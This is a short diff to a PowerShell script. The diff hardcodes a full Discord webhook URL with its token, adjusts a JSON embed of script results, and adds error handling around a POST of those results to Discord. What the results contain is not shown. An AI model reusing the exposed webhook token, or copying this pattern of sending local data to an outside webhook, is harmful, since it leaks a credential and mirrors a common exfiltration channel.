@@ -1,5 +1,5 @@
 $ErrorActionPreference = 'Stop'
-$webhook = "YOUR_DISCORD_WEBHOOK_URL"
+$webhook = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"
 
 # Check Python exists
 try { python --version >$null 2>&1 } catch { 
@@ -83,7 +83,7 @@ try {
     
     # Build Discord payload
     $embed = @{
-        description = "```json`n$results`n```"
+        description = "```json`n$($results)`n```"
         color = if ($results -match 'error') { 16711680 } else { 65280 }
     }
     
@@ -94,6 +94,9 @@ try {
     # Send to Discord
     $jsonPayload = $payload | ConvertTo-Json -Depth 3
     Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonPayload -ContentType 'application/json' >$null
+}
+catch {
+    Write-Host "Error occurred: $_"
 }
 finally {
     Remove-Item $tempFile -ErrorAction SilentlyContinue
